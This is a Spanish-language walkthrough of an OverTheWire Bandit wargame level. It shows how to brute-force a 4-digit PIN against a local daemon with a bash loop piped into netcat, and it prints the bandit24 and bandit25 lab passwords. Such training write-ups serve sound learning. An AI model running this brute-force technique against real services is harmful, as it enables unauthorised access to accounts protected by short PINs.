# Bandit
## Objetivo
Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le proporciona la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN, excepto pasando por todas las 10000 combinaciones, lo que se conoce como fuerza bruta.

## Datos de acceso
**Usuario:** bandit24
**Contraseña:** VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solucion

``` shell
ssh bandit24@bandit.labs.overthewire.org -p2220
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 6666Timeout. Exiting.

bandit24@bandit:~$ echo {0000..0005}
0000 0001 0002 0003 0004 0005

bandit24@bandit:~$ echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar {0000..0005}
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 0001 0002 0003 0004 0005

//creamos distintas secuencias para poder ver cual de estos resibe la contraseña

bandit24@bandit:~$ for i in {0000..0005}; do echo 

//con esto creamos secuencia mediante un for

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005

bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 

//intentamos enviarlo al puerto

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
^C

//podemos filtrar esto con grep -v wrong para que solo muestre el correcto

bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.

p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

```
## Notas adicionales
Con grep -v Wrong! podemos filtrar los resultados incorrectos en un for.

Tambien con echo {0000..0005} podemos crear secuencias de 4 numeros teniendo rango de 0000 a 0005 (usando el echo {0000..0005}).
## Referencias

## Comandos que puedes necesitar para resolver este nivel
